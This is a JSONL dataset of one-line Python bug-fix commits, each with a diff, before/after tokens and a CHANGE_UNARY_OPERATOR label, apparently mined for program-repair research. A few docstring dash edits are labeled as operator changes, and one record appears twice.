{"project": "DendroPy", "commit_sha": "0386572dd1ac1372a4217bf2a5f5116c8e55ad68", "parent_sha": "06eb5c7f8dbfa9bceaee01ebcf3817233d56d3e1", "file_path": "dendropy/datamodel/treecollectionmodel.py", "project_url": "https://github.com/Zsailer/DendroPy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1120,7 +1120,7 @@ class SplitDistribution(taxonmodel.TaxonNamespaceAssociated):\n         for s in self.split_counts:\n             num_unique_splits += 1\n             num_splits += self.split_counts[s]\n-            if treemodel.Bipartition.is_trivial_bitmask(s, taxa_mask):\n+            if not treemodel.Bipartition.is_trivial_bitmask(s, taxa_mask):\n                 num_nt_unique_splits += 1\n                 num_nt_splits += self.split_counts[s]\n         return num_splits, num_unique_splits, num_nt_splits, num_nt_unique_splits\n", "before": "if treemodel . Bipartition . is_trivial_bitmask ( s , taxa_mask ) : num_nt_unique_splits += 1 num_nt_splits += self . split_counts [ s ]", "after": "if not treemodel . Bipartition . is_trivial_bitmask ( s , taxa_mask ) : num_nt_unique_splits += 1 num_nt_splits += self . split_counts [ s ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 5, 54], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 70], 1]]"}
{"project": "DendroPy", "commit_sha": "56084b67e25827e85ebb6de55bbb620da65b1edd", "parent_sha": "3417fe14a962cf17aaa95644fda8d229c03c22d7", "file_path": "dendropy/dataio/nexuswriter.py", "project_url": "https://github.com/Zsailer/DendroPy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,7 +69,7 @@ class NexusWriter(iosys.DataWriter):\n         self.annotations_as_comments = kwargs.get(\"annotations_as_comments\", True)\n         self.annotations_as_nhx = kwargs.get(\"annotations_as_nhx\", False)\n         self.nhx_key_to_func = kwargs.get(\"nhx_key_to_func_dict\")\n-        self.is_write_node_comments = kwargs.get(\"node_comments\", self.simple)\n+        self.is_write_node_comments = kwargs.get(\"node_comments\", not self.simple)\n         self.comment = kwargs.get(\"comment\", [])\n \n     def write(self, stream):\n", "before": "self . is_write_node_comments = kwargs . get ( \"node_comments\" , self . simple )", "after": "self . is_write_node_comments = kwargs . get ( \"node_comments\" , not self . simple )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 49, 3, 79], [\"not_operator\", \"N0\"], 3], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 67, 3, 78], 1]]"}
{"project": "judge", "commit_sha": "3fe187ed279f47bd7721e0d2014753bd333839ef", "parent_sha": "1cd28fa29a074db1dc11ba532451b8490d22902b", "file_path": "sysinfo.py", "project_url": "https://github.com/ByoungJoonIm/judge", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ if hasattr(os, 'getloadavg'):\n         return 'load', os.getloadavg()[0] / _cpu_count\n else:\n     def load_fair():\n-        return 'load', -0.5\n+        return 'load', 0.5\n \n \n def cpu_count():\n", "before": "else : def load_fair ( ) : return 'load' , - 0.5", "after": "else : def load_fair ( ) : return 'load' , 0.5", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"type\", 3, 24, 3, 28], [\"float:0.5\", 3, 25, 3, 28], 0], [\"Delete\", [\"-:-\", 3, 24, 3, 25]], [\"Delete\", [\"unary_operator\", 3, 24, 3, 28]]]"}
{"project": "judge", "commit_sha": "9a780f7f86189ea297975cb7c741cccb8d43721e", "parent_sha": "19d06abd24b7d9558d4cf737201da9426d4c6eef", "file_path": "sysinfo.py", "project_url": "https://github.com/ByoungJoonIm/judge", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ if hasattr(os, 'getloadavg'):\n         return 'load', os.getloadavg()[0] / _cpu_count\n else:\n     def load_fair():\n-        return 'load', -0.5\n+        return 'load', 0.5\n \n \n def cpu_count():\n", "before": "else : def load_fair ( ) : return 'load' , - 0.5", "after": "else : def load_fair ( ) : return 'load' , 0.5", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"type\", 3, 24, 3, 28], [\"float:0.5\", 3, 25, 3, 28], 0], [\"Delete\", [\"-:-\", 3, 24, 3, 25]], [\"Delete\", [\"unary_operator\", 3, 24, 3, 28]]]"}
{"project": "statsmodels", "commit_sha": "1131bb43a6ce79c66531d5f0c7701f5f14468eca", "parent_sha": "4e9bf531456bf70f9a6850d5ea9a1e50d31b0abf", "file_path": "statsmodels/emplike/descriptive.py", "project_url": "https://github.com/galenwilkerson/statsmodels", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -133,7 +133,7 @@ class _OptFuncts(ELModel):\n         x0 = x0.reshape(est_vect.shape[1], 1)\n-        f = lambda x0: np.sum(self._log_star(x0.T, est_vect))\n+        f = lambda x0: - np.sum(self._log_star(x0.T, est_vect))\n         grad = lambda x0: - np.dot((self._get_j_y(x0.T, est_vect)[0]).T, \\\n                               (self._get_j_y(x0.T, est_vect)[1]))\n         hess = lambda x0: np.dot((self._get_j_y(x0.T, est_vect)[0]).T,\n", "before": "f = lambda x0 : np . sum ( self . _log_star ( x0 . T , est_vect ) )", "after": "f = lambda x0 : - np . sum ( self . _log_star ( x0 . T , est_vect ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"lambda\", 1, 13, 1, 62], [\"unary_operator\", \"N0\"], 3], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 1, 24, 1, 62], 1]]"}
{"project": "statsmodels", "commit_sha": "21c7941703d0b006b2b8830ce36e3554d31271d5", "parent_sha": "047994fee041f9d2994e8c7bb4914982b814339c", "file_path": "statsmodels/regression/linear_model.py", "project_url": "https://github.com/galenwilkerson/statsmodels", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1739,7 +1739,7 @@ class RegressionResults(base.LikelihoodModelResults):\n \n         res.cov_type = cov_type\n         # use_t might already be defined by the class, and already set\n-        if not use_t is None:\n+        if use_t is None:\n             use_t = self.use_t\n         res.cov_kwds = {'use_t':use_t}  # store for information\n         res.use_t = use_t\n", "before": "if not use_t is None : use_t = self . use_t", "after": "if use_t is None : use_t = self . use_t", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 9, 4, 31], [\"comparison_operator\", 3, 16, 3, 29], 1], [\"Delete\", [\"not:not\", 3, 12, 3, 15]], [\"Delete\", [\"not_operator\", 3, 12, 3, 29]]]"}
{"project": "statsmodels", "commit_sha": "29e19de308f4c0610fd5bc2afac619f45ef7c9b2", "parent_sha": "5713f4955b767ac6e15d21d79fa5dcc993cd28aa", "file_path": "statsmodels/nonparametric/kernel_density.py", "project_url": "https://github.com/galenwilkerson/statsmodels", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -256,7 +256,7 @@ class KDEMultivariate(GenericKDE):\n             The bandwidth parameter(s).\n \n         Returns\n-        ------\n+        -------\n         CV: float\n             The cross-validation objective function.\n \n", "before": "- - - - - - CV : float", "after": "- - - - - - - CV : float", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"unary_operator\", 3, 14, 4, 18], [\"-:-\", \"T\"], 0], [\"Move\", [\"unary_operator\", 3, 14, 4, 18], [\"unary_operator\", 3, 14, 4, 18], 1]]"}
{"project": "statsmodels", "commit_sha": "1819eaadb6b3b6f102af459d1085ebb20965e7e4", "parent_sha": "cdc6dbbfb933d13358f7023c92a0fe0f857d06da", "file_path": "statsmodels/distributions/tests/test_ecdf.py", "project_url": "https://github.com/galenwilkerson/statsmodels", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,6 +38,6 @@ class TestDistributions(npt.TestCase):\n         x = [6, 7, 8, 9, 10, 11, 12, 13, 14, 15]\n         fn = lambda x : 1./x\n         f = monotone_fn_inverter(fn, x)\n-        npt.assert_array_equal(f.y, x[::1])\n+        npt.assert_array_equal(f.y, x[::-1])\n         npt.assert_array_equal(f.x, y[::-1])\n \n", "before": "npt . assert_array_equal ( f . y , x [ : : 1 ] )", "after": "npt . assert_array_equal ( f . y , x [ : : - 1 ] )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"slice\", 3, 39, 3, 42], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:1\", 3, 41, 3, 42], 1]]"}
{"project": "statsmodels", "commit_sha": "eb6027f9ee6c801d9c3da9940ab274f44f232112", "parent_sha": "7fd32a0caa3f1e1029b21aba28fa5874721dc6f3", "file_path": "statsmodels/iolib/foreign.py", "project_url": "https://github.com/galenwilkerson/statsmodels", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -208,7 +208,7 @@ class StataReader(object):\n         Returns the dataset's label.\n \n         Returns\n-        ------\n+        -------\n         out: string\n", "before": "- - - - - - out : string", "after": "- - - - - - - out : string", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"unary_operator\", 3, 14, 4, 20], [\"-:-\", \"T\"], 0], [\"Move\", [\"unary_operator\", 3, 14, 4, 20], [\"unary_operator\", 3, 14, 4, 20], 1]]"}
{"project": "statsmodels", "commit_sha": "12034dec3b46c1d1d2fb9be34ab4581628e7becf", "parent_sha": "dda7dc34646189e2ac1ce96f54005f582753524c", "file_path": "statsmodels/genmod/generalized_linear_model.py", "project_url": "https://github.com/jarrodmillman/statsmodels", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -267,7 +267,7 @@ class GLM(base.LikelihoodModel):\n             mu is the mean response estimate\n \n         Returns\n-        --------\n+        -------\n         Estimate of scale\n \n         Notes\n", "before": "- - - - - - - - Estimate of scale", "after": "- - - - - - - Estimate of scale", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Delete\", [\"-:-\", 3, 15, 3, 16]]]"}
{"project": "dnf", "commit_sha": "f41c4ebc5467f9f7b161545a5a416f0778f2ed96", "parent_sha": "f7716f4a9b42230e4b53af1a4252ec89d3120acf", "file_path": "dnf/cli/commands/repolist.py", "project_url": "https://github.com/eclipseo/dnf", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -275,7 +275,7 @@ class RepoListCommand(commands.Command):\n             for (rid, rname, (ui_enabled, ui_endis_wid), ui_num) in cols:\n                 if arg == 'disabled': # Don't output a status column.\n                     print(\"%s %s\" % (fill_exact_width(rid, id_len),\n-                                     fill_exact_width(rname, nm_len, -nm_len)))\n+                                     fill_exact_width(rname, nm_len, nm_len)))\n                     continue\n \n                 if ui_num:\n", "before": "print ( \"%s %s\" % ( fill_exact_width ( rid , id_len ) , fill_exact_width ( rname , nm_len , - nm_len ) ) )", "after": "print ( \"%s %s\" % ( fill_exact_width ( rid , id_len ) , fill_exact_width ( rname , nm_len , nm_len ) ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"argument_list\", 3, 54, 3, 78], [\"identifier:nm_len\", 3, 71, 3, 77], 5], [\"Delete\", [\"-:-\", 3, 70, 3, 71]], [\"Delete\", [\"unary_operator\", 3, 70, 3, 77]]]"}
{"project": "requests", "commit_sha": "be564e500cdebff5c0325808adb9ff33610b7c78", "parent_sha": "70d7b134c806cf75c5c4343f9cefa92f9345635a", "file_path": "test_requests.py", "project_url": "https://github.com/shantnu/requests", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1136,7 +1136,7 @@ class TestRequests(object):\n         with contextlib.closing(s.get(httpbin('stream/4'), stream=True)) as response:\n             pass\n \n-        assert not response._content_consumed is False\n+        assert response._content_consumed is False\n         assert response.raw.closed\n \n     @pytest.mark.xfail\n", "before": "assert not response . _content_consumed is False", "after": "assert response . _content_consumed is False", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"assert_statement\", 3, 9, 3, 55], [\"comparison_operator\", 3, 20, 3, 55], 1], [\"Delete\", [\"not:not\", 3, 16, 3, 19]], [\"Delete\", [\"not_operator\", 3, 16, 3, 55]]]"}
{"project": "DICE-Monitoring", "commit_sha": "1d44689acb14738bc6efcdc8e54405c96ccec29a", "parent_sha": "d62ddc25e2192bd9061e98fe30f0b396533f6d36", "file_path": "dmon-logstash/dmon-logstash.py", "project_url": "https://github.com/xlab-si/DICE-Monitoring", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -152,7 +152,7 @@ class LSController(Resource):\n         sslCert = os.path.join(credDir, 'logstash.crt')\n         sslKey = os.path.join(credDir, 'logstash.key')\n \n-        if not os.path.isfile(sslCert) or os.path.isfile(sslKey):\n+        if not os.path.isfile(sslCert) or not os.path.isfile(sslKey):\n             response = jsonify({'Status': 'Credential Error',\n                                 'Message': 'Missing keys'})\n             response.status_code = 404\n", "before": "if not os . path . isfile ( sslCert ) or os . path . isfile ( sslKey ) : response = jsonify ( { 'Status' : 'Credential Error' , 'Message' : 'Missing keys' } ) response . status_code = 404", "after": "if not os . path . isfile ( sslCert ) or not os . path . isfile ( sslKey ) : response = jsonify ( { 'Status' : 'Credential Error' , 'Message' : 'Missing keys' } ) response . status_code = 404", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 65], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 43, 3, 65], 1]]"}
{"project": "weblate", "commit_sha": "cdc559e48b96a81103ee0f10617333c01631bafb", "parent_sha": "f7015c2278c0c3718f9d72c66986d20b44079d44", "file_path": "weblate/trans/admin_views.py", "project_url": "https://github.com/nschonni/weblate", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ def performance(request):\n     # Check offloading indexing\n     checks.append((\n         _('Indexing offloading'),\n-        not settings.OFFLOAD_INDEXING,\n+        settings.OFFLOAD_INDEXING,\n         'production-indexing',\n     ))\n     # Check for sane caching\n", "before": "checks . append ( ( _ ( 'Indexing offloading' ) , not settings . OFFLOAD_INDEXING , 'production-indexing' , ) )", "after": "checks . append ( ( _ ( 'Indexing offloading' ) , settings . OFFLOAD_INDEXING , 'production-indexing' , ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"tuple\", 1, 19, 5, 6], [\"attribute\", 3, 13, 3, 38], 3], [\"Delete\", [\"not:not\", 3, 9, 3, 12]], [\"Delete\", [\"not_operator\", 3, 9, 3, 38]]]"}
{"project": "ds_tempest_rm_me_please", "commit_sha": "ff3d5c6e35560f7377c373d0179557b1a7f070a9", "parent_sha": "c72393ba2fef16f5531afbd4a97b7bfbcecc80f6", "file_path": "tempest/tests/compute/__init__.py", "project_url": "https://github.com/gamado/ds_tempest_rm_me_please", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ def setup_package():\n         if user2 and user1 != user2:\n             user2_password = CONFIG.compute.alt_password\n             user2_tenant_name = CONFIG.compute.alt_tenant_name\n-            if not user2_password or user2_tenant_name:\n+            if not user2_password or not user2_tenant_name:\n                 msg = (\"Alternate user specified but not alternate \"\n                        \"tenant or password\")\n                 raise nose.SkipTest(msg)\n", "before": "if not user2_password or user2_tenant_name : msg = ( \"Alternate user specified but not alternate \" \"tenant or password\" ) raise nose . SkipTest ( msg )", "after": "if not user2_password or not user2_tenant_name : msg = ( \"Alternate user specified but not alternate \" \"tenant or password\" ) raise nose . SkipTest ( msg )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 20, 3, 55], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:user2_tenant_name\", 3, 38, 3, 55], 1]]"}
{"project": "beets", "commit_sha": "7a1a7d035f7d69bb92e8d2a9d3844b9ec812fd81", "parent_sha": "3be24110d720e3c4151ee60730c7bd5b12427a2b", "file_path": "beets/mediafile.py", "project_url": "https://github.com/popookitty/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -547,7 +547,7 @@ class MediaField(object):\n             # Remove suffix.\n             if style.suffix and isinstance(out, (str, unicode)):\n                 if out.endswith(style.suffix):\n-                    out = out[:len(style.suffix)]\n+                    out = out[:-len(style.suffix)]\n \n             # MPEG-4 freeform frames are (should be?) encoded as UTF-8.\n             if obj.type == 'mp4' and style.key.startswith('----:') and \\\n", "before": "out = out [ : len ( style . suffix ) ]", "after": "out = out [ : - len ( style . suffix ) ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"slice\", 3, 31, 3, 49], [\"unary_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 32, 3, 49], 1]]"}
{"project": "HiggsAnalysis-KITHiggsToTauTau", "commit_sha": "0c7e078e09c4200121f929ca9f681aee051b0cae", "parent_sha": "b12b6fe35fd4d6e10e55ed7ab4a671b41ce5a37e", "file_path": "python/plotting/configs/samples_run2_2016.py", "project_url": "https://github.com/anehrkor/HiggsAnalysis-KITHiggsToTauTau", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ class Samples(samples.SamplesBase):\n \t@staticmethod\n \tdef ttt_genmatch(channel, kwargs):\n \t\tif channel in [\"mt\", \"et\"]:\n-\t\t\tif not kwargs.get(\"mssm\", False):\n+\t\t\tif kwargs.get(\"mssm\", False):\n \t\t\t\treturn \"(gen_match_2 < 6)\"\n \t\t\telse:\n \t\t\t\treturn \"(gen_match_2 == 5)\"\n", "before": "if not kwargs . get ( \"mssm\" , False ) : return \"(gen_match_2 < 6)\" else : return \"(gen_match_2 == 5)\"", "after": "if kwargs . get ( \"mssm\" , False ) : return \"(gen_match_2 < 6)\" else : return \"(gen_match_2 == 5)\"", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 4, 6, 32], [\"call\", 3, 11, 3, 36], 1], [\"Delete\", [\"not:not\", 3, 7, 3, 10]], [\"Delete\", [\"not_operator\", 3, 7, 3, 36]]]"}
{"project": "pymc3", "commit_sha": "757208ca589dd784b0104d6ee040c589d0977609", "parent_sha": "6d4b333e749995706980d1dd1f31291c1572c8c5", "file_path": "pymc/step_methods/metropolis.py", "project_url": "https://github.com/sk38897/pymc3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ class Metropolis(ArrayStep):\n     @withmodel\n     def __init__(self, model, vars, C, scaling=.25, is_cov = False):\n \n-        self.potential = quad_potential(C, is_cov)\n+        self.potential = quad_potential(C, not is_cov)\n         self.scaling = scaling\n         super(Metropolis,self).__init__(vars, [model.logpc])\n         \n", "before": "self . potential = quad_potential ( C , is_cov )", "after": "self . potential = quad_potential ( C , not is_cov )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 40, 3, 51], [\"not_operator\", \"N0\"], 3], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:is_cov\", 3, 44, 3, 50], 1]]"}
{"project": "pymc3", "commit_sha": "77d8715a415bf00036731a695d04b878cae5572b", "parent_sha": "f52d4112d06deac3eb5f762b9c7129689c84149d", "file_path": "pymc3/distributions/continuous.py", "project_url": "https://github.com/sk38897/pymc3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ class UnitContinuous(Continuous):\n         super(UnitContinuous, self).__init__(\n             transform=transform, *args, **kwargs)\n \n-def assert_negative_support(var, label, distname, value=1e-6):\n+def assert_negative_support(var, label, distname, value=-1e-6):\n     # Checks for evidence of positive support for a variable\n     if var is None:\n         return\n", "before": "def assert_negative_support ( var , label , distname , value = 1e-6 ) : if var is None : return", "after": "def assert_negative_support ( var , label , distname , value = - 1e-6 ) : if var is None : return", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 51, 3, 61], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"float:1e-6\", 3, 57, 3, 61], 1]]"}
{"project": "rasa_nlu", "commit_sha": "08a7faa12016182f29b15aa99b778e460d86c059", "parent_sha": "7bd340948790ec5835cbebe519deba964afad677", "file_path": "rasa_nlu/featurizers/ngram_featurizer.py", "project_url": "https://github.com/mukesh-mehta/rasa_nlu", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -282,7 +282,7 @@ class NGramFeaturizer(Featurizer):\n         from sklearn.linear_model import LogisticRegression\n         from sklearn.model_selection import cross_val_score\n \n-        if self.all_ngrams:\n+        if not self.all_ngrams:\n             logger.debug(\"Found no ngrams. Using existing features.\")\n             return 0\n \n", "before": "if self . all_ngrams : logger . debug ( \"Found no ngrams. Using existing features.\" ) return 0", "after": "if not self . all_ngrams : logger . debug ( \"Found no ngrams. Using existing features.\" ) return 0", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 5, 21], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 27], 1]]"}
{"project": "pymc3", "commit_sha": "a49ee041cf021ec33d2bc694a9d4ff8fb0083b20", "parent_sha": "0db132df695afb3a5f0569b10c1aa59331a9e33a", "file_path": "tests/test_model_func.py", "project_url": "https://github.com/sk38897/pymc3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -23,4 +23,4 @@ def test_dlogp2():\n     \n     d2logp = model.d2logpc()\n \n-    close_to(d2logp(start), -H, np.abs(H/100.))\n+    close_to(d2logp(start), H, np.abs(H/100.))\n", "before": "close_to ( d2logp ( start ) , - H , np . abs ( H / 100. ) )", "after": "close_to ( d2logp ( start ) , H , np . abs ( H / 100. ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"argument_list\", 3, 13, 3, 48], [\"identifier:H\", 3, 30, 3, 31], 3], [\"Delete\", [\"-:-\", 3, 29, 3, 30]], [\"Delete\", [\"unary_operator\", 3, 29, 3, 31]]]"}
{"project": "visbrain", "commit_sha": "eaad974e2cc43688f5828356ede978b6b99ea6ec", "parent_sha": "d79af9680238ca1b906688d11ea1d6517e40b75c", "file_path": "visbrain/sleep/interface/uiElements/uiInfo.py", "project_url": "https://github.com/iraquitan/visbrain", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ class uiInfo(object):\n         \"\"\"Complete the table sleep info.\"\"\"\n         # Get sleep info :\n         win = self._infoTime.value()\n-        stats = sleepstats(self._file, self._hyp.mesh.pos[:, 1], self._sf, win)\n+        stats = sleepstats(self._file, -self._hyp.mesh.pos[:, 1], self._sf, win)\n         self._keysInfo = ['Window'] + [''] * len(stats)\n         self._valInfo = [str(win)] + [''] * len(stats)\n         # Check line number:\n", "before": "stats = sleepstats ( self . _file , self . _hyp . mesh . pos [ : , 1 ] , self . _sf , win )", "after": "stats = sleepstats ( self . _file , - self . _hyp . mesh . pos [ : , 1 ] , self . _sf , win )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 27, 3, 80], [\"unary_operator\", \"N0\"], 3], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"subscript\", 3, 40, 3, 64], 1]]"}
{"project": "POCS", "commit_sha": "4b20c30477cd042b8548c51eefb960fd81b47027", "parent_sha": "7687ef85d8de98fa5fa979a42b5603c45bedc56d", "file_path": "panoptes/weather/AAGCloudSensor.py", "project_url": "https://github.com/jamessynge/POCS", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1056,7 +1056,7 @@ def plot_weather(date_string):\n     ##-------------------------------------------------------------------------\n     ## Safe/Unsafe vs. Time\n     safe_axes = plt.axes(plot_positions[3][1])\n-    safe_value = [int(not x['data']['Safe'])\\\n+    safe_value = [int(x['data']['Safe'])\\\n                   for x in entries\\\n                   if 'Safe' in x['data'].keys()]\n     safe_time = [x['date'] for x in entries\\\n", "before": "safe_value = [ int ( not x [ 'data' ] [ 'Safe' ] ) for x in entries if 'Safe' in x [ 'data' ] . keys ( ) ]", "after": "safe_value = [ int ( x [ 'data' ] [ 'Safe' ] ) for x in entries if 'Safe' in x [ 'data' ] . keys ( ) ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"argument_list\", 3, 22, 3, 45], [\"subscript\", 3, 27, 3, 44], 1], [\"Delete\", [\"not:not\", 3, 23, 3, 26]], [\"Delete\", [\"not_operator\", 3, 23, 3, 44]]]"}
{"project": "sevabot", "commit_sha": "f2924aa5074f7864c99a3ae67ee106a24c23aa76", "parent_sha": "329b768dbf8cf6362ca7eef61a32934698f14de9", "file_path": "bot.py", "project_url": "https://github.com/bkmeneguello/sevabot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ class Sevabot:\n         cron = []\n \n         for source in glob('modules/*.py'):\n-            name = source[8:3]\n+            name = source[8:-3]\n             module = imp.load_source(\"!\"+name, source)\n             \n             commands = module.getCommands()\n", "before": "name = source [ 8 : 3 ]", "after": "name = source [ 8 : - 3 ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"slice\", 3, 27, 3, 30], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:3\", 3, 29, 3, 30], 1]]"}
{"project": "tensor2tensor", "commit_sha": "f23f535d19644ce3693045c4674d1044cb454751", "parent_sha": "fc6037d3ea9a4878ae85a0d8761a8d66a292fbdf", "file_path": "tensor2tensor/utils/decoding.py", "project_url": "https://github.com/ftarlaci/tensor2tensor", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -956,7 +956,7 @@ def _decode_input_tensor_to_features_dict(feature_map, hparams):\n \n \n def get_step_from_ckpt_path(path):\n-  return int(os.path.basename(path).split(\"-\")[1])\n+  return int(os.path.basename(path).split(\"-\")[-1])\n \n \n def latest_checkpoint_step(ckpt_dir):\n", "before": "return int ( os . path . basename ( path ) . split ( \"-\" ) [ 1 ] )", "after": "return int ( os . path . basename ( path ) . split ( \"-\" ) [ - 1 ] )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"subscript\", 3, 14, 3, 50], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:1\", 3, 48, 3, 49], 1]]"}
{"project": "odoo-addons-grap", "commit_sha": "7dfde4466816f07d100d35df73fbf92e04b7b0b5", "parent_sha": "d999d2332751117e16a6a7807bb4fae6b0b51f27", "file_path": "pos_multiple_cash_control/model/pos_box_out.py", "project_url": "https://github.com/akretion/odoo-addons-grap", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ class pos_box_out(TransientModel):\n             if pbo.amount < 0:\n                 vals['amount'] = pbo.amount\n             else:\n-                vals['amount'] = pbo.amount\n+                vals['amount'] = - pbo.amount\n             vals['ref'] = \"%s\" % (pbo.name or '')\n             vals['name'] = \"%s \" % (pbo.name or '')\n             absl_obj.create(cr, uid, vals, context=context)\n", "before": "vals [ 'amount' ] = pbo . amount", "after": "vals [ 'amount' ] = - pbo . amount", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"assignment\", 3, 17, 3, 44], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 34, 3, 44], 1]]"}
{"project": "ballet", "commit_sha": "606161b67fc568906fa334e36e093328c3ae06fa", "parent_sha": "6adf99e5c40e2a8a62ab83cb89e344b4c30a9523", "file_path": "ballet/validation/main.py", "project_url": "https://github.com/HDI-Project/ballet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -89,7 +89,7 @@ def evaluate_feature_performance(project, force=False):\n @validation_stage('pruning existing features')\n def prune_existing_features(project, force=False):\n     \"\"\"Prune existing features\"\"\"\n-    if not force and project.on_master_after_merge():\n+    if not force and not project.on_master_after_merge():\n         raise SkippedValidationTest('Not on master')\n \n     out = project.build()\n", "before": "if not force and project . on_master_after_merge ( ) : raise SkippedValidationTest ( 'Not on master' )", "after": "if not force and not project . on_master_after_merge ( ) : raise SkippedValidationTest ( 'Not on master' )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 53], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 22, 3, 53], 1]]"}
